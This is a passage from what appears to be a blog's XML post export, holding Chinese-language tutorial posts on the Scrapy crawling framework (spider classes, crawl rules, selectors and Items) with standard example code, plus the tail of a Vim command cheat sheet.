注释第3-5行3,5 s/^#//g 解除3-5行的注释1,$ s/^/#/g 注释整个文档。:%s/^/#/g 注释整个文档，此法更快。25、帮助:help or F1 显示整个帮助:help xxx 显示xxx的帮助，比如 :help i, :help CTRL-[（即Ctrl+[的帮助）。:help ‘number’ Vim选项的帮助用单引号括起:help 特殊键的帮助用&lt;&gt;扩起:help -t Vim启动参数的帮助用-]]></content>
      <categories>
        <category>Linux</category>
        <category>常用命令</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫技术七]]></title>
    <url>%2F2016%2F12%2F28%2Fthird%2F</url>
    <content type="text"><![CDATA[CSVFeedSpiderclass scrapy.contrib.spiders.CSVFeedSpider该spider除了其按行遍历而不是节点之外其他和XMLFeedSpider十分类似。 而其在每次迭代时调用的是 parse_row() 。1、delimiter在CSV文件中用于区分字段的分隔符。类型为string。默认为’,’(逗号)2、quotecharA string with the enclosure character for each field in the CSV file Defaults to ‘“‘ (quotation mark).3、headers在CSV文件中包含的用来提取字段的行的列表。4、parse_row(response,row)该方法接收一个response对象及一个以提供或检测出来的header为键的字典(代表每行)。 该spider中，您也可以覆盖 adapt_response 及 process_results 方法来进行预处理(pre-processing)及后(post-processing)处理。 CSVFeedSpider例子1234567891011121314151617181920from scrapy import logfrom scrapy.contrib.spiders import CSVFeedSpiderfrom myproject.items import TestItemclass MySpider(CSVFeedSpider): name = 'example.com' allowed_domains = ['example.com'] start_urls = ['http://www.example.com/feed.csv'] delimiter = ';' quotechar = "'" headers = ['id', 'name', 'description'] def parse_row(self, response, row): log.msg('Hi, this is a row!: %r' % row) item = TestItem() item['id'] = row['id'] item['name'] = row['name'] item['description'] = row['description'] return item 这个怎么说呢，分析一下吧！前面的name，allowed_domains,start_urls这就不说了，老套路。主要说headers类属性，根据传进去的列表id,name,description他就可以给你提取出来这些属性的值。每次会给你返回一行。就像XMLFeedSpider的itertag会给你返回一个节点。]]></content>
      <categories>
        <category>python</category>
        <category>scrapy</category>
        <category>CSVFeedSpider</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫技术六]]></title>
    <url>%2F2016%2F12%2F28%2Fsecond%2F</url>
    <content type="text"><![CDATA[XMLFeedSpiderXMLFeedSpider被设计用于通过迭代各个节点来分析XML源(XML feed)。 迭代器可以从 iternodes ， xml ， html 选择。 鉴于 xml 以及 html 迭代器需要先读取所有DOM再分析而引起的性能问题， 一般还是推荐使用 iternodes 。 不过使用 html 作为迭代器能有效应对错误的XML。你必须定义下列类属性来设置迭代器以及标签名:1、iterator用于确定使用哪个迭代器的string。可选项有: iternodes 一个高性能的基于正则表达式的迭代器。 html 使用selector的迭代器。需要注意的是该迭代器使用DOM进行分析，其需要将所有的DOM载入内存。 xml 使用selector的迭代器。需要注意的是该迭代器使用DOM进行分析，其需要将所有的DOM载入内存。默认值为iternodes。2、itertag一个包含开始迭代的节点名的string。例如:1itertag='product' 3、namespaces一个由(prefix,url)元组所组成的list。其定义了在该文档中会被spider处理的可用的namespace。prefix及url会被自动调用register_namespace()生成namespace。你可以通过在itertag属性中制定节点的namespace。例如:12345class YourSpider(XMLFeedSpider): namespaces = [('n', 'http://www.sitemaps.org/schemas/sitemap/0.9')] itertag = 'n:url' # ... 除了这些新的属性之外，该spider也有以下可以覆盖的方法:1、adapt_response(response)该方法在spider分析response前被调用。你可以在response被分析之前使用该函数来修改内容(body)。该方法接受一个response并返回一个response(可以相同也可以不同)。2、parse_node(response,selector)当节点符合提供的标签名时(itertag)该方法被调用。接收到的response以及相应的selector作为参数传递给该方法。该方法返回一个Iten对象或者Request对象或者一个包含二者得可迭代对象(iterable)。3、process_results(response,results)当spider返回结果(item或request)时该方法被调用。设定该方法的目的是在结果返回给框架核心(framework core)之前做最后的处理，例如设定item的ID。其接受一个结果的列表及对应的response。其结果必须返回一个结果的列表包含item或者request的对象)。 XMLFeedSpider例子12345678910111213141516171819from scrapy import logfrom scrapy.contrib.spiders import XMLFeedSpiderfrom myproject.items import TestItemclass MySpider(XMLFeedSpider): name = 'example.com' allowed_domains = ['example.com'] start_urls = ['http://www.example.com/feed.xml'] iterator = 'iternodes' # This is actually unnecessary, since it's the default value itertag = 'item' def parse_node(self, response, node): log.msg('Hi, this is a &lt;%s&gt; node!: %s' % (self.itertag, ''.join(node.extract()))) item = TestItem() item['id'] = node.xpath('@id').extract() item['name'] = node.xpath('name').extract() item['description'] = node.xpath('description').extract() return item 简单来说，我们在这里创建了一个spider，从给定的 start_urls 中下载feed， 并迭代feed中每个 item 标签，输出，并在 Item 中存储有些随机数据。这个spider就是可以具体返回到某个节点的所有selector。然后你处理的时候有两种选择，一种是根据原始response进行筛选，另一种就是根据你定义的itertag继续往下筛选。减少了表达式。]]></content>
      <categories>
        <category>python</category>
        <category>scrapy</category>
        <category>XMLFeedSpider</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫技术五]]></title>
    <url>%2F2016%2F12%2F28%2Ffirst%2F</url>
    <content type="text"><![CDATA[CrawlSpiderclass scrapy.contrib.spiders.CrawlSpider爬取一般网站常用的都是这个spider。他定义了一些规则(rule)来提供跟进link的方便机制。一个spider不可能适用所有场景，但其对很多情况都适用。所以你可以以这个spider为起点，根据需求修改部分方法。当然你也可以实现自己的spider。除了从Spider继承过来的属性外，其提供了一个新的属性:1、rules一个包含一个(或多个)Rule对象的集合(list)。每个Rule对爬取网站的动作定义了特定表现。Rule对象在下边会介绍。如果多个rule匹配了相同的链接，则根据他们在本属性中被定义的顺序，第一个会被使用。该spider也提供了一个可复写(overrideable)的方法:2、parse_start_url(response)当start_url的请求返回时，该方法被调用。该方法分析最初的返回值并必须返回一个Item对象或者一个Request对象或者一个可迭代的包含二者的对象。 爬取规则(Crawling rules)class scrapy.contrib.spiders.Rule(link_extractor, callback=None, cb_kwargs=None, follow=None, process_links=None, process_request=None) link_extractor是一个Link Extractor对象。其定义了如何从爬取到的页面提取链接。 callback是一个callable或string(该spider中同名的函数将会被调用).从link_extractor中每获取到链接时将会调用该函数。该回调函数接受一个response作为其第一个参数，并返回一个包含Item以及request对象的列表(list)。警告当编写爬虫规则时，请避免使用parse作为回调函数。由于CrawSpider使用parse方法来实现逻辑，如果你覆盖了这个方法，crawlspider将要失败。 cb_kwargs包含传递给回调函数的参数的字典。 follow是一个布尔值，指定了根据该规则从response提取的链接是否需要跟进。如果callback为None，follow默认设置为True，否则默认为False。 process_links是一个callable或string。从link_extractor中获取到链接列表时将会调用该函数。该方法主要用来过滤。 process_request是一个callable或string(该spider中同名的函数将会被调用)。该规则提取到每个request时都会调用该函数。该函数必须返回一个request或者None。(用来过滤request)这前面都是解释参数。剖析样例12345678910111213141516171819202122232425import scrapyfrom scrapy.contrib.spiders import CrawlSpider, Rulefrom scrapy.contrib.linkextractors import LinkExtractorclass MySpider(CrawlSpider): name = 'example.com' allowed_domains = ['example.com'] start_urls = ['http://www.example.com'] rules = ( # 提取匹配 'category.php' (但不匹配 'subsection.php') 的链接并跟进链接(没有callback意味着follow默认为True) Rule(LinkExtractor(allow=('category\.php', ), deny=('subsection\.php', ))), # 提取匹配 'item.php' 的链接并使用spider的parse_item方法进行分析 Rule(LinkExtractor(allow=('item\.php', )), callback='parse_item'), ) def parse_item(self, response): self.log('Hi, this is an item page! %s' % response.url) item = scrapy.Item() item['id'] = response.xpath('//td[@id="item_id"]/text()').re(r'ID: (\d+)') item['name'] = response.xpath('//td[@id="item_name"]/text()').extract() item['description'] = response.xpath('//td[@id="item_description"]/text()').extract() return item 首先你要导入scrapy这个包，然后再从这个包里面的什么地方拿出什么东西。我们从scrapy.contrib.spiders这个位置拿出了CrawlSpider,Rule,从scrapy.contrib.linkextractors拿出了LinkExtractor接着我们就创建一个继承CrawlSpider的MySpider类。制作CrawlSpider的已经继承了最初的Spider类。所以你这相当于第三次继承。也就是对Spider进行扩展成CrawlSpider，然后你再去扩展。像name当然是不可缺少的，然后允许的域名allowed_domains,再然后就是start_urls这些基本上都没变。主要是后面的。后面定义了rules元组(touple)，元组里面使用了Rule,当提取了http://www.exanple.com这个主页后就会进行下面的链接提取，如果主页里面有http://www.exanple.com/item.php那么他就会被爬取，并返回response对象给parse_item回调函数。parse_item回调函数就会针对response对象应用各种解析器进行解析。解析过后染回Item。该spider将从example.com的首页开始爬取，获取category以及item的链接并对后者使用 parse_item 方法。 当item获得返回(response)时，将使用XPath处理HTML并生成一些数据填入 Item 中。这就是CrawlSpider。]]></content>
      <categories>
        <category>python</category>
        <category>scrapy</category>
        <category>CrawlSpider</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫技术八]]></title>
    <url>%2F2016%2F12%2F28%2Ffourth%2F</url>
    <content type="text"><![CDATA[SitemapSpiderclass scrapy.contrib.spiders.SitemapSpiderSitemapSpider使您爬取网站时可以通过 Sitemaps 来发现爬取的URL。 其支持嵌套的sitemap，并能从 robots.txt 中获取sitemap的url。1、sitemap_urls包含你需要爬取的url的sitemap的url列表。你可以指定为一个robots.txt,spider会从中分析并提取url。2、sitemap_rules一个包含(regex,callback)元组的列表： regex是一个用于匹配从sitemap提供的url的正则表达式。regex可以是一个字符串或者编译的正则对象。 callback指定了匹配正则表达式的url的处理函数。callback可以是一个字符串(spider中方法的名字)或者是callable。例如:1sitemap_rules=[('/product/','parse_product')] 规则按顺序进行匹配，之后第一个匹配才会被应用。如果你忽略该属性，sitemap中发现的所有url将会被parse函数处理。3、sitemap_follow一个用于匹配要跟进的sitemap的正则表达式的列表(list)。其仅仅被应用在 使用 Sitemap index files 来指向其他sitemap文件的站点。 默认情况下所有的sitemap都会被跟进。4、sitemap_alternate_links指定当一个 url 有可选的链接时，是否跟进。 有些非英文网站会在一个 url 块内提供其他语言的网站链接。例如:1234&lt;url&gt; &lt;loc&gt;http://example.com/&lt;/loc&gt; &lt;xhtml:link rel="alternate" hreflang="de" href="http://example.com/de"/&gt;&lt;/url&gt; 当 sitemap_alternate_links 设置时，两个URL都会被获取。 当 sitemap_alternate_links 关闭时，只有 http://example.com/ 会被获取。 默认 sitemap_alternate_links 关闭。 SitemapSpider样例简单的例子:使用parse处理通过sitemap发现的所有url:1234567from scrapy.contrib.spiders import SitemapSpiderclass MySpider(SitemapSpider): sitemap_urls = ['http://www.example.com/sitemap.xml'] def parse(self, response): pass # ... scrape item here ... 用特定的函数处理某些url，其他的使用另外的callback:1234567891011121314from scrapy.contrib.spiders import SitemapSpiderclass MySpider(SitemapSpider): sitemap_urls = ['http://www.example.com/sitemap.xml'] sitemap_rules = [ ('/product/', 'parse_product'), ('/category/', 'parse_category'), ] def parse_product(self, response): pass # ... scrape product ... def parse_category(self, response): pass # ... scrape category ... 跟进robots.txt文件定义的sitemap并只跟进包含有..sitemap_shop的url:1234567891011from scrapy.contrib.spiders import SitemapSpiderclass MySpider(SitemapSpider): sitemap_urls = ['http://www.example.com/robots.txt'] sitemap_rules = [ ('/shop/', 'parse_shop'), ] sitemap_follow = ['/sitemap_shops'] def parse_shop(self, response): pass # ... scrape shop here ... 在SitemapSpider中使用其他url:1234567891011121314151617181920from scrapy.contrib.spiders import SitemapSpiderclass MySpider(SitemapSpider): sitemap_urls = ['http://www.example.com/robots.txt'] sitemap_rules = [ ('/shop/', 'parse_shop'), ] other_urls = ['http://www.example.com/about'] def start_requests(self): requests = list(super(MySpider, self).start_requests()) requests += [scrapy.Request(x, self.parse_other) for x in self.other_urls] return requests def parse_shop(self, response): pass # ... scrape shop here ... def parse_other(self, response): pass # ... scrape other here ... 反正前面提到的这几种spider都是对原始Spider的一种重写。自己也可以做一个spider然后继承使用。但是要继承原始的Spider。]]></content>
      <categories>
        <category>python</category>
        <category>scrapy</category>
        <category>SitemapSpider</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫技术二]]></title>
    <url>%2F2016%2F12%2F27%2Fsecond%2F</url>
    <content type="text"><![CDATA[scrapy.Item理解1、Selectors选择器为什么要先说这个呢？因为没有这个，就算你定义了item也没卵用。从网页提取数据有很多方法。scrapy使用了一种基于XPth和CSS表达式机制:Scrapy Selectors这里给一些XPath表达式的例子及对应的含义： /html/head/title:选择HTML文档中标签内的元素 /html/head/title/text():选择上面提到的元素的文字 //td:选择所有的元素 //div[@class=”mine”]:选择所有具有class=”mine”属性的div元素 //div/a/@href:提取所有div标签内的a标签里的属性为href的值。Selector有四个基本的方法： xpath():传入xpath表达式，返回该表达式所对应的所有节点的selector list列表。 css():传入CSS表达式，返回该表达式所对应的所有节点的selector list列表 extract():序列化该节点为Unicode字符串并返回list。 re():根据传入的正则表达式对数据进行提取，返回Unicode字符串list列表。这里估计你们有点不理解这四者的不同，他们不同在哪里呢？举个例子吧！xpath(),css()就是个中间过程，真正的终结者是extract(),re().前两者返回的都还是selector，selector是什么呢？你们可以在shell中尝试一下就知道了。一般都有内置的IPython终端。直接说吧！首先在项目的根目录，执行下面命令启动shell:1scrapy shell "http://www.dmoz.org/Computers/Programming/Languages/Python/Books/" 载入完成后你会得到一个response的本地变量。输入response.body将输出response的包体，输出response.headers可以看到response的包头。这些都是浮云，重要的是你要用response.selector，你可以直接使用快捷方法:response.xpath()和response.css()。试一下吧！1234567891011121314In [1]: response.xpath('//title')Out[1]: [&lt;Selector xpath='//title' data=u'&lt;title&gt;Open Directory - Computers: Progr'&gt;]In [2]: response.xpath('//title').extract()Out[2]: [u'&lt;title&gt;Open Directory - Computers: Programming: Languages: Python: Books&lt;/title&gt;']In [3]: response.xpath('//title/text()')Out[3]: [&lt;Selector xpath='//title/text()' data=u'Open Directory - Computers: Programming:'&gt;]In [4]: response.xpath('//title/text()').extract()Out[4]: [u'Open Directory - Computers: Programming: Languages: Python: Books']In [5]: response.xpath('//title/text()').re('(\w+):')Out[5]: [u'Computers', u'Programming', u'Languages', u'Python'] 大家都可以看到，结尾没有extract()和re()的都返回的是[]的一个列表。而结尾用了的都被终结了。所以就这个意思吧！自己领会一下，呵呵。2、提取数据我们利用选择器肯定是要提取有用的数据，那么我们一开始怎么知道是有用的数据呢？这就要说一下源码了，你要通过工具找出你要爬的网站有什么信息值得你去爬取或者值得未来去分析。比如说官网的这个，在查看了网页的源码后，您会发现网站的信息是被包含在第二个元素中。首先我们要获取这个标签里面的标签还是内容要分清，还是要逐级去筛选。1&gt;&gt;&gt; response.xpath('//ul/li') 再在li标签获取文字1&gt;&gt;&gt; response.xpath('//ul/li/text()').extract() 在li标签下的a标签获取@href的属性值。1&gt;&gt;&gt; response.xpath('//ul/li/a/@href').extract() 当然在实际中我们是这样做的。根据.xpath()返回的selector组成的list，用for in循环来一个提取。12345for sel in response.xpath('//ul/li'): title = sel.xpath('a/text()').extract() link = sel.xpath('a/@href').extract() desc = sel.xpath('text()').extract() print title, link, desc 那么你可以把我们第一次做的那个爬虫，加入这个代码，输出得到的数据。3、使用item现在我们正式使用item，item对像是自定义的python字典，你可以使用标准的字典语法来获取到其每个字段的值。(字段就是我们之前用Field赋值的属性):1234&gt;&gt;&gt; item = DmozItem()&gt;&gt;&gt; item['title'] = 'Example title'&gt;&gt;&gt; item['title']'Example title' 12345678910111213141516171819import scrapyfrom tutorial.items import DmozItemclass DmozSpider(scrapy.Spider): name = "dmoz" allowed_domains = ["dmoz.org"] start_urls = [ "http://www.dmoz.org/Computers/Programming/Languages/Python/Books/", "http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/" ] def parse(self, response): for sel in response.xpath('//ul/li'): item = DmozItem() item['title'] = sel.xpath('a/text()').extract() item['link'] = sel.xpath('a/@href').extract() item['desc'] = sel.xpath('text()').extract() yield item 怎么把这些数据保存到文件中呢？使用命令1scrapy crawl dmoz -o items.json 该命令将采用JSON格式对爬取的数据进行序列化，生成items.json文件到你的项目根目录。如果需要对爬取到的item做更多更为复杂的操作，您可以编写 Item Pipeline 。 类似于我们在创建项目时对Item做的，用于您编写自己的 tutorial/pipelines.py 也被创建。 不过如果您仅仅想要保存item，您不需要实现任何的pipeline。]]></content>
      <categories>
        <category>python</category>
        <category>scrapy</category>
        <category>item</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫技术一]]></title>
    <url>%2F2016%2F12%2F27%2Ffirst%2F</url>
    <content type="text"><![CDATA[编写我的第一个爬虫1、创建项目创建项目之前，博主想唠叨一下，不管你是在windows编程还是在linux编程，命令都是离不开的，所以scrapy有大量的命令要记，而且scrapy这个框架应用了大量的回调和继承父类并重写部分方法达到整个框架的运行，当然这是博主的理解。所以想要学好scrapy，就一定要对回调这种机制，继承并重写父类属性方法要有充分的理解。1$ scrapy startproject tutorial scrapy startproject 项目名称。该命令将会创建包含下列内容的tutorial(也就是项目名称)12345678910tutorial/ scrapy.cfg tutorial/ __init__.py items.py pipelines.py settings.py spiders/ __init__.py ... 说一下这些文件的用处吧！ scrapy.cfg:项目的配置文件 tutorial/:该项目的python模块。之后您将在此加入代码。 tutorial/items.py:该项目的item文件。 tutorial/pipelines.py:项目中的pipelines文件。 tutorial/settings.py:项目中的设置文件。 tutorial/spiders:放置spider代码的目录。2、定义ItemItem是保存爬取到的数据的容器。它的使用方法跟python的字典是一样一样的，而且提供了额外保护机制来避免拼写错误导致的未定义字段错误。类似在ORM中做的一样，您可以通过创建一个scrapy.Item类，并且定义类型为scrapy.Field的类属性来定义一个Item。首先我们要决定爬取哪个网站，拿到他的域名。然后我们就针对dmoz.org吧，这个跟官网一样。我们先想好要从这个网站获取title,link,description,然后我们就可以开始编辑tutorial目录中的items.py文件。123456import scrapyclass DmozItem(scrapy.Item): title = scrapy.Field() link = scrapy.Field() desc = scrapy.Field() 我们写了一个继承了scrapy.Item类的DmozItem类，然后用了scrapy.Field()方法分别创建了类属性title,link,desc。我的理解是scrapy.Field()方法要用到scrapy.Item这个类。所以要继承这个类。我们定义好了数据字典，肯定要去拿数据了。3、编写爬虫SpiderSpider是用户编写用于从单个网站(或者一些网站)爬取数据的类。官网是先说明在写的代码，我的风格是先贴代码，再按照我的理解来说。1234567891011121314import scrapyclass DmozSpider(scrapy.Spider): name = "dmoz" allowed_domains = ["dmoz.org"] start_urls = [ "http://www.dmoz.org/Computers/Programming/Languages/Python/Books/", "http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/" ] def parse(self, response): filename = response.url.split("/")[-2] with open(filename, 'wb') as f: f.write(response.body) 可以看到我们导入了一个scrapy包我们让DmozSpider继承了scrapy包下的Spider类，我在之前说了，应用scrapy的核心之一就是继承父类并重写父类的属性和方法，现在就开始吧！先说一下属性的含义吧！ name:用于区别Spider。该名字必须是唯一的，您不可以为不同的Spider设定相同的名字。 start_urls:包含了spider在启动时进行爬取的url列表。因此，第一个被获取到的页面将是其中之一。后续的URL则从初始的URL获取到的数据中提取。 parse()是spider的一个放法。被调用时，每个初始URL完成下载后生成的Response对象将会作为唯一的参数传递给该函数。该方法负责解析返回的数据(response data),提取数据(生成item)以及生成需要进一步处理的URL的request对象。说了这么多，还有不明白的，我来进一步说吧！首先我们重写Spider这个父类的name属性，这个属性就是你的spider的标识符。allowed_domains是你允许爬取的域名。start_urls是一个数组，是你需要爬取的地址。parse(self,response)是一个回调函数，他最终会接受一个response对象，这个包含了网页的所有内容。3、那么基本第一个爬虫我们已经搭建好了，接下来就应该开始爬了。同样还是命令，回到项目的根目录，有scrapy.cfg的就是项目的根目录。执行下列命令：1$ scrapy crawl dmoz 就这样你的爬虫就运行起来，也就是你的爬虫的helloworld。4、说说这整个的详细过程吧Scrapy为Spider的start_urls属性中的每个URL创建了scrapy.Request对象，并将parse方法作为回调函数赋值给了Request。那么最终真正执行的是含有Request的方法，你写的都是配置文件，呜呜。Request对象经过调度，执行生成scrapy.http.Response对象并送回给你写的Spider parse()方法。其实也就是你重写后的方法，现在是不是感觉你写的有点用了。这样你应该了解你做了什么吧！]]></content>
      <categories>
        <category>python</category>
        <category>scrapy</category>
        <category>spiders</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫技术四]]></title>
    <url>%2F2016%2F12%2F27%2Ffourth%2F</url>
    <content type="text"><![CDATA[初探SpiderSpider其实已经定义了爬取某个网站的所有的类，包括了爬取的动作以及如何从网页的内容中提取结构化数据。再次说一下整个框架的过程吧！1、以初始的URL初始化Request，并设置回调函数。当该request下载完毕并返回时，将生成response，并作为参数传给该回调函数。spider中初始的request是通过调用start_requests()来获取的。start_requests()读取start_urls中URL，并以parse为回调函数生成response(这里和官网不同，中文官网好像翻译错了)。2、在回调函数内分析返回的网页内容。返回Item对象或者reque或者一个或者两者的可迭代容器。返回的request对象之后会经过scrapy处理，下载相应的内容，并调用设置的callback函数(函数可相同).3、在回调函数内，你可以用选择器(selector),你也可以用BeautifulSoup,lxml或者你想用的任何解析器来分析网页内容，并根据分析的数据生成Item。4、最后，由spider返回的Item将被存到数据库(由某些Item Pipeline处理)或使用Feed exports存入到文件中。虽然该循环对任何类型的spider都(多少)适用，但Scrapy仍然为了不同的需求提供了多种默认spider。 之后将讨论这些spider。 Spider参数Spider可以通过接受参数来修改其功能。 spider参数一般用来定义初始URL或者指定限制爬取网站的部分。 您也可以使用其来配置spider的任何功能。在运行 crawl 时添加 -a 可以传递Spider参数:1scrapy crawl myspider -a category=electronics Spider在构造器(constructor)中获取参数:123456789import scrapyclass MySpider(Spider): name = 'myspider' def __init__(self, category=None, *args, **kwargs): super(MySpider, self).__init__(*args, **kwargs) self.start_urls = ['http://www.example.com/categories/%s' % category] # ... 最基本的SpiderSpider是最简单的spider。每个其他的spider必须继承自该类(包括Scrapy自带的其他spider以及您自己编写的spider)。 Spider并没有提供什么特殊的功能。 其仅仅请求给定的 start_urls/start_requests ，并根据返回的结果(resulting responses)调用spider的 parse 方法。 name定义spider名字的字符串(string)。spider的名字定义了Scrapy如何定位(并初始化)spider，所以其必须是唯一的。 不过您可以生成多个相同的spider实例(instance)，这没有任何限制。 name是spider最重要的属性，而且是必须的。如果该spider爬取单个网站(single domain)，一个常见的做法是以该网站(domain)(加或不加 后缀 )来命名spider。 例如，如果spider爬取 mywebsite.com ，该spider通常会被命名为 mywebsite 。 allowed_domains可选。包含了spider允许爬取的域名(domain)列表(list)。 当 OffsiteMiddleware 启用时， 域名不在列表中的URL不会被跟进。 start_urlsURL列表。当没有制定特定的URL时，spider将从该列表中开始进行爬取。 因此，第一个被获取到的页面的URL将是该列表之一。 后续的URL将会从获取到的数据中提取。 start_requests()该方法必须返回一个可迭代对象(iterable)。该对象包含了spider用于爬取的第一个Request。 当spider启动爬取并且未制定URL时，该方法被调用。 当指定了URL时，make_requests_from_url() 将被调用来创建Request对象。 该方法仅仅会被Scrapy调用一次，因此您可以将其实现为生成器。 该方法的默认实现是使用 start_urls 的url生成Request。 如果您想要修改最初爬取某个网站的Request对象，您可以重写(override)该方法。 例如，如果您需要在启动时以POST登录某个网站，你可以这么写:123456789def start_requests(self): return [scrapy.FormRequest("http://www.example.com/login", formdata=&#123;'user': 'john', 'pass': 'secret'&#125;, callback=self.logged_in)]def logged_in(self, response): # here you would extract links to follow and return Requests for # each of them, with another callback pass marke_requests_from_url(url)该方法接受一个URL并返回用于爬取的 Request 对象。 该方法在初始化request时被 start_requests() 调用，也被用于转化url为request。 默认未被复写(overridden)的情况下，该方法返回的Request对象中， parse() 作为回调函数，dont_filter参数也被设置为开启。 parse当response没有指定回调函数时，该方法是Scrapy处理下载的response的默认方法。 parse 负责处理response并返回处理的数据以及(/或)跟进的URL。 Spider 对其他的Request的回调函数也有相同的要求。 该方法及其他的Request回调函数必须返回一个包含 Request 及(或) Item 的可迭代的对象。 log(message[,level,component])使用 scrapy.log.msg() 方法记录(log)message。 log中自动带上该spider的 name 属性。 closed(reason)当spider关闭时，该函数被调用。 该方法提供了一个替代调用signals.connect()来监听 spider_closed 信号的快捷方式。中文官网的例子：12345678910111213import scrapyclass MySpider(scrapy.Spider): name = 'example.com' allowed_domains = ['example.com'] start_urls = [ 'http://www.example.com/1.html', 'http://www.example.com/2.html', 'http://www.example.com/3.html', ] def parse(self, response): self.log('A response from %s just arrived!' % response.url) 另一个在单个回调函数中返回多个Request以及Item的例子:12345678910111213141516171819import scrapyfrom myproject.items import MyItemclass MySpider(scrapy.Spider): name = 'example.com' allowed_domains = ['example.com'] start_urls = [ 'http://www.example.com/1.html', 'http://www.example.com/2.html', 'http://www.example.com/3.html', ] def parse(self, response): sel = scrapy.Selector(response) for h3 in response.xpath('//h3').extract(): yield MyItem(title=h3) for url in response.xpath('//a/@href').extract(): yield scrapy.Request(url, callback=self.parse)]]></content>
      <categories>
        <category>python</category>
        <category>scrapy</category>
        <category>spiders</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫技术三]]></title>
    <url>%2F2016%2F12%2F27%2Fthird%2F</url>
    <content type="text"><![CDATA[声明ItemItem在scrapy中非常重要，所以还是再说一下。Item使用简单的class定义语法以及Field对象来声明。例如:1234567import scrapyclass Product(scrapy.Item): name = scrapy.Field() price = scrapy.Field() stock = scrapy.Field() last_updated = scrapy.Field(serializer=str) 他和Django的Models很像，不过没有什么不同的字段类型。我想应该是这样的，你要做网站肯定要考虑各种安全性，包括数据的控制，防注入。但是我爬取网站，在乎个什么安全，越在乎，还降低我工具的性能，应该是这样。 Item字段(Item Fields)Field对象指明了每个字段的元数据(metadata)。例如下面例子中last_updated中指明了该字段的序列化函数。你可以为每个字段指明任何类型的元数据。Field对象对接受的值没有任何限制。也正是因为这个原因，文档也无法提供所有可用的元数据的键(key)参考列表。 Field 对象中保存的每个键可以由多个组件使用，并且只有这些组件知道这个键的存在。您可以根据自己的需求，定义使用其他的 Field 键。 设置 Field 对象的主要目的就是在一个地方定义好所有的元数据。 一般来说，那些依赖某个字段的组件肯定使用了特定的键(key)。您必须查看组件相关的文档，查看其用了哪些元数据键(metadata key)。需要注意的是，用来声明item的 Field 对象并没有被赋值为class的属性。 不过您可以通过 Item.fields 属性进行访问。 与Item配合接下来按照官网的边操作边看不同点创建item12345678910&gt;&gt;&gt;import scrapy&gt;&gt;&gt;class Product(scrapy.Item):... name = scrapy.Field()... price = scrapy.Field()... stock = scrapy.Field()... last_updated = scrapy.Field(serializer=str)&gt;&gt;&gt; product = Product(name='Desktop PC', price=1000)&gt;&gt;&gt; print product&#123;name='Desktop PC', price=1000&#125; 获取字段的值1234567891011121314151617181920212223242526272829303132333435363738394041424344&gt;&gt;&gt; product['name']Desktop PC&gt;&gt;&gt; product.get('name')Desktop PC&gt;&gt;&gt; product['price']1000&gt;&gt;&gt; product['last_updated']Traceback (most recent call last): ...KeyError: 'last_updated'&gt;&gt;&gt; product.get('last_updated', 'not set')not set&gt;&gt;&gt; product['lala'] # getting unknown fieldTraceback (most recent call last): ...KeyError: 'lala'&gt;&gt;&gt; product.get('lala', 'unknown field')'unknown field'&gt;&gt;&gt; 'name' in product # is name field populated?True&gt;&gt;&gt; 'last_updated' in product # is last_updated populated?False&gt;&gt;&gt; 'last_updated' in product.fields # is last_updated a declared field?True&gt;&gt;&gt; 'lala' in product.fields # is lala a declared field?False设置字段的值&gt;&gt;&gt; product['last_updated'] = 'today'&gt;&gt;&gt; product['last_updated']today&gt;&gt;&gt; product['lala'] = 'test' # setting unknown fieldTraceback (most recent call last): ...KeyError: 'Product does not support field: lala' 获取所有获取到的值12345&gt;&gt;&gt; product.keys()['price', 'name']&gt;&gt;&gt; product.items()[('price', 1000), ('name', 'Desktop PC')] 复制item:1234567&gt;&gt;&gt; product2 = Product(product)&gt;&gt;&gt; print product2Product(name='Desktop PC', price=1000)&gt;&gt;&gt; product3 = product2.copy()&gt;&gt;&gt; print product3Product(name='Desktop PC', price=1000) 根据item创建字典(dict):12&gt;&gt;&gt; dict(product) # create a dict from all populated values&#123;'price': 1000, 'name': 'Desktop PC'&#125; 根据字典(dict)创建item:1234567&gt;&gt;&gt; Product(&#123;'name': 'Laptop PC', 'price': 1500&#125;)Product(price=1500, name='Laptop PC')&gt;&gt;&gt; Product(&#123;'name': 'Laptop PC', 'lala': 1500&#125;) # warning: unknown field in dictTraceback (most recent call last): ...KeyError: 'Product does not support field: lala' 扩展Item您可以通过继承原始的Item来扩展item(添加更多的字段或者修改某些字段的元数据)。例如：123class DiscountedProduct(Product): discount_percent = scrapy.Field(serializer=str) discount_expiration_date = scrapy.Field() 您也可以通过使用原字段的元数据,添加新的值或修改原来的值来扩展字段的元数据:12class SpecificProduct(Product): name = scrapy.Field(Product.fields['name'], serializer=my_serializer) 这段代码在保留所有原来的元数据值的情况下添加(或者覆盖)了 name 字段的 serializer 。 Item对象class scrapy.item.Item([arg])返回一个根据给定的参数可选初始化的item。Item复制了标准的 dict API 。包括初始化函数也相同。Item唯一额外添加的属性是:fields一个包含了item所有声明的字段的字典，而不仅仅是获取到的字段。该字典的key是字段(field)的名字，值是 Item声明 中使用到的 Field 对象。 字段(Field)对象class scrapy.item.Field([arg])Field 仅仅是内置的 dict 类的一个别名，并没有提供额外的方法或者属性。换句话说， Field 对象完完全全就是Python字典(dict)。被用来基于类属性(class attribute)的方法来支持 item声明语法 。]]></content>
      <categories>
        <category>python</category>
        <category>scrapy</category>
        <category>item</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[asp.net异步请求]]></title>
    <url>%2F2016%2F12%2F26%2Fthird%2F</url>
